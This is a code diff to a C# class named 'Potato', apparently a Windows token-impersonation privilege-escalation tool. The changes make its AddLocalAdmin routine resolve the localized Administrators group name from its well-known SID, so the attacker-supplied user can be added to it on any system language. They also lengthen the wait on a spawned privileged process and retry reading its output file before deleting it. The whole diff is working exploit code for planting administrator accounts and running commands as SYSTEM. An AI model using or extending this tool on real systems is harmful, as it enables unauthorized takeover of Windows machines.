@@ -53,6 +53,8 @@ public class Potato
     static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TP newState, int bufLen, IntPtr prev, IntPtr retLen);
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     static extern bool LookupPrivilegeValueW(string sys, string name, out long luid);
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    static extern bool LookupAccountSidW(string sys, IntPtr sid, StringBuilder name, ref int nameLen, StringBuilder dom, ref int domLen, out int use);
     [DllImport("kernel32.dll")]
     static extern IntPtr GetCurrentThread();
     [DllImport("kernel32.dll")]
@@ -725,6 +727,19 @@ public class Potato
         return _got;
     }
 
+    static string GetAdminGroupName()
+    {
+        byte[] sidBytes = { 1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 0x20, 0x02, 0, 0 };
+        IntPtr sidPtr = Marshal.AllocHGlobal(sidBytes.Length);
+        Marshal.Copy(sidBytes, 0, sidPtr, sidBytes.Length);
+        var name = new StringBuilder(256);
+        var dom = new StringBuilder(256);
+        int nLen = 256, dLen = 256, use;
+        bool ok = LookupAccountSidW(null, sidPtr, name, ref nLen, dom, ref dLen, out use);
+        Marshal.FreeHGlobal(sidPtr);
+        return ok ? name.ToString() : "Administrators";
+    }
+
     static string AddLocalAdmin(string user, string pass)
     {
         IntPtr impToken;
@@ -756,7 +771,7 @@ public class Potato
 
         IntPtr mi = Marshal.AllocHGlobal(ptrSize);
         Marshal.WriteIntPtr(mi, 0, Marshal.StringToHGlobalUni(user));
-        ret = NetLocalGroupAddMembers(null, "Administrators", 3, mi, 1);
+        ret = NetLocalGroupAddMembers(null, GetAdminGroupName(), 3, mi, 1);
         Marshal.FreeHGlobal(Marshal.ReadIntPtr(mi, 0));
         Marshal.FreeHGlobal(mi);
 
@@ -802,10 +817,14 @@ public class Potato
         }
         RevertToSelf(); CloseHandle(impToken);
 
-        WaitForSingleObject(pi.hProc, 30000);
+        WaitForSingleObject(pi.hProc, 90000);
         string output = "";
-        try { if (File.Exists(tf)) output = File.ReadAllText(tf).Trim(); }
-        catch { }
+        for (int rt = 0; rt < 3; rt++)
+        {
+            try { if (File.Exists(tf)) { output = File.ReadAllText(tf).Trim(); if (output.Length > 0) break; } }
+            catch { }
+            if (rt < 2) Thread.Sleep(500);
+        }
         try { File.Delete(tf); } catch { }
         if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
         CloseHandle(pi.hProc); CloseHandle(pi.hThread);
